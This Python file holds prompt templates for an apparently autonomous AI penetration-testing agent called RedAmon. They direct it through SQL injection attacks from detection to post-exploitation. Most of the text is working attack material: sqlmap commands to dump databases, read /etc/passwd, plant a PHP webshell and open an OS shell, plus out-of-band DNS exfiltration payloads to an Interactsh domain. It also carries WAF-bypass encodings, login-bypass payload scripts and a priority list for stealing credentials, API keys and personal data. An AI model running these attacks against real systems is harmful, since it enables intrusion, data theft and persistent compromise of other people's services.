"""
RedAmon SQL Injection Prompts

Prompts for SQL injection attack workflows including detection, exploitation,
WAF bypass, data exfiltration, and out-of-band (OOB) techniques.

Uses existing tools:
- kali_shell: For sqlmap, interactsh-client
- execute_curl: For manual HTTP injection testing
- execute_code: For custom Python exploit scripts
"""


# =============================================================================
# SQL INJECTION MAIN WORKFLOW
# =============================================================================

SQL_INJECTION_TOOLS = """
## ATTACK SKILL: SQL INJECTION

**CRITICAL: This objective has been CLASSIFIED as SQL injection attack.**
**You MUST follow the SQL injection workflow below. Do NOT switch to other attack methods.**

Focus on identifying and exploiting SQL injection vulnerabilities in web applications.

---

## PRE-CONFIGURED SETTINGS (from project settings)

- **SQLMap risk level:** {sqli_risk} (1=safe, 2=medium, 3=aggressive)
- **SQLMap level:** {sqli_level} (1-5, higher = more tests)
- **Tamper scripts:** {sqli_tamper}
- **Max retries:** {sqli_max_attempts}
- **Threads:** {sqli_threads}
- **Timeout:** {sqli_timeout} seconds

---

## RETRY POLICY

**Maximum SQLi attempts: {sqli_max_attempts}**

If an injection technique fails, you MUST try DIFFERENT techniques up to {sqli_max_attempts} times.
Each retry should vary: different parameter, injection type, tamper script, or manual payload.
Track attempts in your TODO list.

---

## MANDATORY SQL INJECTION WORKFLOW

### Step 1: Identify Injection Points

1. Query the graph for web endpoints with parameters (GET/POST)
2. Look for existing vulnerability indicators:
   - Nuclei findings with `sqli`, `injection` tags
   - Error messages containing SQL syntax
   - Database-specific error patterns
3. If no known vectors, enumerate parameters from discovered endpoints

### Step 2: Detection & Fingerprinting

**Use kali_shell with sqlmap for automated detection:**

```bash
# Basic detection scan
sqlmap -u "http://target/page?id=1" --batch --risk={sqli_risk} --level={sqli_level} --threads={sqli_threads} --timeout={sqli_timeout} --dbs
```

**For POST parameters:**
```bash
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch --risk={sqli_risk} --level={sqli_level} --threads={sqli_threads}
```

**If WAF detected, add tamper scripts:**
```bash
sqlmap -u "http://target/page?id=1" --batch --tamper={sqli_tamper} --risk={sqli_risk} --level={sqli_level} --threads={sqli_threads}
```

### Step 3: Manual Testing (if sqlmap fails)

**Use execute_curl for manual payload injection:**

```bash
# Basic SQLi test
execute_curl -s "http://target/page?id=1'"

# Time-based blind test (MySQL)
execute_curl -s "http://target/page?id=1' AND SLEEP(5)--"

# Union-based detection
execute_curl -s "http://target/page?id=1' UNION SELECT NULL,NULL--"
```

**Use execute_code for complex payloads:**

```python
import requests

# Auth bypass test
payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--"]
for p in payloads:
    r = requests.post("http://target/login", data={{"user": p, "pass": "x"}})
    print(f"{{p}}: {{r.status_code}} {{len(r.text)}}")
```

### Step 4: Data Extraction

**Once injection confirmed, extract data:**

```bash
# Enumerate databases
sqlmap -u "http://target/page?id=1" --batch --dbs

# Enumerate tables
sqlmap -u "http://target/page?id=1" --batch -D database_name --tables

# Dump table
sqlmap -u "http://target/page?id=1" --batch -D database_name -T users --dump
```

### Step 5: Out-of-Band (OOB) Exfiltration

**When blind injection with no visible output — use Interactsh:**

```bash
# Start interactsh-client in background, capture domain
interactsh-client -v 2>&1 | tee /tmp/interactsh.log &
sleep 3
OAST_DOMAIN=$(grep -oP '[a-z0-9]+\\.oast\\.fun' /tmp/interactsh.log | head -1)
echo "Use this domain: $OAST_DOMAIN"
```

**SQLMap with DNS exfiltration:**
```bash
sqlmap -u "http://target/page?id=1" --batch --dns-domain=$OAST_DOMAIN --dbs
```

**Check for interactions:**
```bash
# Poll the interactsh log for callbacks
tail -f /tmp/interactsh.log
```

### Step 6: Verify & Complete

- Data extracted → action="complete", report findings (tables, credentials, data)
- Injection confirmed but data access blocked → report vulnerability with evidence
- No injection found after {sqli_max_attempts} attempts → action="complete", report target is not vulnerable

---

## TROUBLESHOOTING

| Problem | Fix |
|---------|-----|
| sqlmap returns "no injection found" | Increase --level/--risk, try different parameters, use tamper scripts |
| WAF blocking requests | Add --tamper (space2comment, randomcase, charencode), use --random-agent |
| Time-based too slow | Try error-based or OOB techniques instead |
| Cannot start interactsh | Use https://app.interactsh.com web interface as fallback |
| Same technique fails repeatedly | STOP after {sqli_max_attempts}, report service is resilient |
"""


# =============================================================================
# SQL INJECTION TECHNIQUE SELECTION
# =============================================================================

SQL_INJECTION_TECHNIQUES = """
## SQLi TECHNIQUE SELECTION GUIDE

Each row specifies the **best approach** for that injection type.

---

### Error-Based Injection (Tool: `kali_shell` → `sqlmap`)

| DBMS | Payload Example | When to use |
|------|-----------------|-------------|
| MySQL | `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--` | SQL errors visible in response |
| MSSQL | `' AND 1=CONVERT(int,@@version)--` | SQL errors visible in response |
| Oracle | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--` | SQL errors visible in response |
| PostgreSQL | `' AND 1=CAST(version() AS int)--` | SQL errors visible in response |

**SQLMap command:**
```bash
sqlmap -u "http://target/page?id=1" --batch --technique=E --dbs
```

---

### Union-Based Injection (Tool: `kali_shell` → `sqlmap`)

| Step | Command |
|------|---------|
| Find column count | `' ORDER BY 1--`, `' ORDER BY 2--` ... until error |
| Find output column | `' UNION SELECT NULL,NULL,'test',NULL--` |
| Extract data | `' UNION SELECT NULL,username,password,NULL FROM users--` |

**SQLMap command:**
```bash
sqlmap -u "http://target/page?id=1" --batch --technique=U --dbs
```

---

### Blind Boolean-Based (Tool: `kali_shell` → `sqlmap`)

| DBMS | Payload Example |
|------|-----------------|
| MySQL | `' AND SUBSTRING(version(),1,1)='5'--` |
| MSSQL | `' AND SUBSTRING(@@version,1,1)='M'--` |
| Generic | `' AND 1=1--` (true) vs `' AND 1=2--` (false) |

**SQLMap command:**
```bash
sqlmap -u "http://target/page?id=1" --batch --technique=B --dbs
```

---

### Blind Time-Based (Tool: `kali_shell` → `sqlmap`)

| DBMS | Payload |
|------|---------|
| MySQL | `' AND SLEEP(5)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` |
| PostgreSQL | `'; SELECT pg_sleep(5)--` |
| Oracle | `' AND DBMS_LOCK.SLEEP(5)=1--` |

**SQLMap command:**
```bash
sqlmap -u "http://target/page?id=1" --batch --technique=T --dbs
```

---

### Out-of-Band DNS Exfiltration (Tool: `kali_shell` → `interactsh-client` + `sqlmap`)

| DBMS | Payload (replace YOUR_DOMAIN with Interactsh domain) |
|------|-------------------------------------------------------|
| MySQL (Windows) | `' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.YOUR_DOMAIN\\\\a'))--` |
| MSSQL | `'; EXEC master..xp_dirtree '\\\\YOUR_DOMAIN\\a'--` |
| Oracle | `' AND UTL_HTTP.REQUEST('http://'||user||'.YOUR_DOMAIN/')=1--` |
| PostgreSQL | `'; SELECT dblink_connect('host=YOUR_DOMAIN')--` |

**SQLMap with DNS exfiltration:**
```bash
sqlmap -u "http://target/page?id=1" --batch --dns-domain=YOUR_DOMAIN.oast.fun --dbs
```

---

### Second-Order Injection (Tool: `execute_code`)

Register payload as username, trigger on different action:

```python
import requests

# Step 1: Register with malicious username
requests.post("http://target/register", data={{
    "username": "admin'--",
    "password": "password123"
}})

# Step 2: Trigger via password reset or profile view
r = requests.get("http://target/profile?user=admin'--")
print(r.text)
```
"""


# =============================================================================
# SQL INJECTION WAF BYPASS
# =============================================================================

SQL_INJECTION_WAF_BYPASS = """
## WAF BYPASS TECHNIQUES

### SQLMap Tamper Scripts (most effective)

| Tamper Script | Description | Best For |
|---------------|-------------|----------|
| `space2comment` | Replace spaces with /**/ | Generic WAFs |
| `randomcase` | Random case for keywords | Case-sensitive filters |
| `charencode` | URL encode all characters | URL-based filters |
| `between` | Replace > with NOT BETWEEN | Comparison filters |
| `equaltolike` | Replace = with LIKE | Equality filters |
| `modsecurityversioned` | MySQL versioned comments | ModSecurity |
| `space2mssqlblank` | MSSQL-specific space bypass | MSSQL behind WAF |
| `versionedkeywords` | MySQL versioned keywords | MySQL + WAF |
| `space2plus` | Replace spaces with + | Plus-sign tolerant WAFs |
| `percentage` | Add % signs between chars | Percent encoding bypass |

**Usage:**
```bash
sqlmap -u "http://target/page?id=1" --batch --tamper=space2comment,randomcase,charencode --dbs
```

---

### Manual Encoding Techniques (use execute_code)

| Technique | Original | Encoded |
|-----------|----------|---------|
| Hex encoding | `'` | `0x27` |
| CHAR() function | `'` | `CHAR(39)` |
| Unicode | `'` | `%u0027` |
| Double URL encoding | `'` | `%2527` |
| Comment obfuscation | `SELECT` | `S/**/E/**/L/**/E/**/C/**/T` |
| Null byte | `'` | `%00'` |

---

### Syntax Alternatives

| Original | Alternatives |
|----------|--------------|
| `AND` | `&&`, `%26%26` |
| `OR` | `||`, `%7c%7c` |
| Space | `/**/`, `%0a`, `%09`, `+` |
| `=` | `LIKE`, `REGEXP`, `RLIKE`, `<>0` |
| `SELECT` | `/*!50000SELECT*/` (MySQL version comment) |
| Quotes | Hex strings, `CHAR()`, `CHR()` |
"""


# =============================================================================
# SQL INJECTION AUTH BYPASS
# =============================================================================

SQL_INJECTION_AUTH_BYPASS = """
## AUTHENTICATION BYPASS PAYLOADS

### Universal Login Bypass

Use execute_code for systematic testing:

```python
import requests

url = "http://target/login"
payloads = [
    # Classic OR-based
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    # Admin injection
    "admin'--",
    "admin' #",
    "admin'/*",
    # Parenthesis variants
    "') OR ('1'='1",
    "')) OR (('1'='1",
    # NULL-based
    "' OR 'x'='x",
    "' OR ''='",
    # Comment variations
    "1' OR '1'='1' -- -",
    "1' OR '1'='1' /*",
]

for p in payloads:
    r = requests.post(url, data={{"username": p, "password": "x"}}, allow_redirects=False)
    indicator = "dashboard" in r.text.lower() or r.status_code in [302, 303]
    print(f"{{p[:30]}}: {{r.status_code}} {{'[BYPASS]' if indicator else ''}}")
```

### NoSQL Injection (MongoDB)

```python
import requests

url = "http://target/login"
payloads = [
    {{"username": {{"$ne": ""}}, "password": {{"$ne": ""}}}},
    {{"username": {{"$gt": ""}}, "password": {{"$gt": ""}}}},
    {{"username": {{"$regex": ".*"}}, "password": {{"$regex": ".*"}}}},
]

for p in payloads:
    r = requests.post(url, json=p)
    print(f"{{p}}: {{r.status_code}}")
```
"""


# =============================================================================
# SQL INJECTION POST-EXPLOITATION
# =============================================================================

SQL_INJECTION_POST_EXPLOITATION = """
## POST-EXPLOITATION VIA SQL INJECTION

### File System Access (use kali_shell → sqlmap)

**Read files:**
```bash
sqlmap -u "http://target/page?id=1" --batch --file-read="/etc/passwd"
```

**Write files (webshell):**
```bash
sqlmap -u "http://target/page?id=1" --batch --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

---

### OS Command Execution (use kali_shell → sqlmap)

**Trigger OS shell:**
```bash
sqlmap -u "http://target/page?id=1" --batch --os-shell
```

**Execute specific command:**
```bash
sqlmap -u "http://target/page?id=1" --batch --os-cmd="whoami"
```

---

### Privilege Escalation Checks

**MySQL - check privileges:**
```bash
sqlmap -u "http://target/page?id=1" --batch --privileges
```

**Check current user:**
```bash
sqlmap -u "http://target/page?id=1" --batch --current-user
```

**Check if DBA:**
```bash
sqlmap -u "http://target/page?id=1" --batch --is-dba
```

---

### Data Exfiltration Priority

1. **Credentials:** `users`, `accounts`, `admins`, `logins` tables
2. **API Keys:** `api_keys`, `tokens`, `secrets`, `config` tables
3. **PII:** `customers`, `members`, `profiles` tables
4. **Session data:** `sessions`, `cookies` tables

**Dump specific columns:**
```bash
sqlmap -u "http://target/page?id=1" --batch -D db -T users -C username,password --dump
```
"""
